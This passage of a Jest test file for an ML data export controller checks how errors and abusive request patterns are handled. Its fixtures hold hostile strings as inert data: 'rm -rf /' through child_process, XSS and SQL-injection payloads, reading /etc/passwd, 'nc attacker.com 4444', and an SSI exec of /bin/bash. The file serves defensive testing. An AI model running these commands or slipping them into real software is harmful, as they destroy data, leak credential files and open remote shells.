          stack: 'eval("malicious code")',
          __proto__: { admin: true },
          toString: () => 'require("child_process").exec("rm -rf /")',
          valueOf: () => ({ exploit: true }),
          constructor: { name: 'AdminError' }
        },
        new Error('Normal error with __proto__ pollution').__proto__ = { admin: true },
        Object.assign(new Error('Error with exploit'), { 
          exploit: 'process.exit(1)',
          backdoor: () => 'system compromised'
        })
      ];

      for (const maliciousError of maliciousErrors) {
        mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
        mockExportService.exportMLData.mockRejectedValue(maliciousError as any);

        // Act
        await exportController.createMLExport(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Error should be passed to error handler
        expect(mockNext).toHaveBeenCalledWith(maliciousError);

        // Reset mocks for next iteration
        jest.clearAllMocks();
      }
    });

    it('should prevent error-based information disclosure', async () => {
      // Arrange - Errors that could reveal sensitive information
      const sensitiveErrors = [
        new Error('ENOENT: no such file or directory, open \'/var/secrets/database.key\''),
        new Error('Connection refused: Could not connect to Redis at redis://admin:password@cache:6379'),
        new Error('Access denied for user \'root\'@\'localhost\' (using password: YES)'),
        new Error('Permission denied: Cannot read /etc/shadow'),
        new Error('Module not found: /opt/app/internal/secret-module.js')
      ];

      for (const error of sensitiveErrors) {
        mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
        mockExportService.exportMLData.mockRejectedValue(error);

        // Act
        await exportController.createMLExport(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Sensitive error should be passed to error middleware for sanitization
        expect(mockNext).toHaveBeenCalledWith(error);

        // Reset mocks for next iteration
        jest.clearAllMocks();
      }
    });

    it('should handle error message injection attacks', async () => {
      // Arrange - Inject malicious content through error messages
      const injectedErrors = [
        new Error('Export failed: <script>alert("xss")</script>'),
        new Error('Database error: \'; DROP TABLE users; --'),
        new Error('File error: $(rm -rf /)'),
        new Error('Process error: `cat /etc/passwd`'),
        new Error('Network error: ||nc attacker.com 4444'),
        new Error('Validation error: <!--#exec cmd="/bin/bash"-->')
      ];

      for (const error of injectedErrors) {
        mockRequest.body = { options: ExportMocks.createMockMLExportOptions() };
        mockExportService.exportMLData.mockRejectedValue(error);

        // Act
        await exportController.createMLExport(
          mockRequest as Request,
          mockResponse as Response,
          mockNext
        );

        // Assert - Malicious error messages should be passed to error handler
        expect(mockNext).toHaveBeenCalledWith(error);

        // Reset mocks for next iteration
        jest.clearAllMocks();
      }
    });
  });

  describe('Rate Limiting & Abuse Prevention', () => {
    it('should handle rapid-fire requests from single user', async () => {
      // Arrange - Rapid consecutive requests
      const rapidRequests = 200;
      const promises: Promise<void>[] = [];

      for (let i = 0; i < rapidRequests; i++) {
        const request = ExportTestHelpers.createMockRequest({
          user: { id: mockUserId, email: 'test@example.com', name: 'Test User' },
          body: { options: ExportMocks.createMockMLExportOptions() }
        });
        const response = ExportTestHelpers.createMockResponse();
        const next = ExportTestHelpers.createMockNext();

        mockExportService.exportMLData.mockResolvedValue(`job-${i}`);

        promises.push(
          exportController.createMLExport(
            request as Request,
            response as Response,
            next
          )
        );
      }

      const startTime = Date.now();

      // Act
      await Promise.all(promises);

      const duration = Date.now() - startTime;

      // Assert - Should handle rapid requests (rate limiting at middleware level)
      expect(duration).toBeLessThan(60000); // Should complete within 1 minute
      expect(mockExportService.exportMLData).toHaveBeenCalledTimes(rapidRequests);
    });

    it('should handle distributed attack simulation', async () => {
      // Arrange - Simulate distributed attack from multiple IPs/users
      const attackVectors = Array.from({ length: 100 }, (_, i) => ({
        userId: `attacker-${i}`,
        ip: `192.168.1.${i % 255}`,
        userAgent: `AttackBot/${i}.0`,
        request: ExportMocks.createMockMLExportOptions()
      }));

      const promises = attackVectors.map(async (vector, index) => {
        const request = ExportTestHelpers.createMockRequest({
          user: { id: vector.userId, email: `${vector.userId}@evil.com`, name: vector.userId },
          body: { options: vector.request },
          headers: {
            'x-forwarded-for': vector.ip,
            'user-agent': vector.userAgent
          }
        });
        const response = ExportTestHelpers.createMockResponse();
        const next = ExportTestHelpers.createMockNext();

        mockExportService.exportMLData.mockResolvedValue(`job-${index}`);

        return exportController.createMLExport(
          request as Request,
          response as Response,
          next
        );
      });

      // Act
      await Promise.all(promises);

      // Assert - Should handle distributed attack
      expect(mockExportService.exportMLData).toHaveBeenCalledTimes(attackVectors.length);
    });
  });

  /* Commented out temporarily
  // Helper method for creating deeply nested objects
  createDeeplyNestedObject(depth: number): any {
    if (depth <= 0) return 'leaf';
    return { 
      nested: this.createDeeplyNestedObject(depth - 1),
      level: depth,
      payload: `attack-level-${depth}`,
      exploit: depth === 5000 ? 'middle-payload' : null
    };
  }
  */
});

// Additional helper for setting up mocks consistently
const setupMocks = () => {
  return {
    mockRequest: {
      user: { id: 'user123' },
      body: { options: {} },
      params: {}
    } as any,
    mockResponse: {
      status: jest.fn().mockReturnThis(),
      json: jest.fn(),
      setHeader: jest.fn(), // Always include this
      download: jest.fn()
    } as any,
    mockNext: jest.fn()
  };
};

// Example of using the helper
describe('Example with helper', () => {
  it('should work with consistent mocks', async () => {
    const { mockRequest, mockResponse, mockNext } = setupMocks();
    
    // Your test logic here
    await exportController.createMLExport(mockRequest, mockResponse, mockNext);
    
    // Assertions
  });
});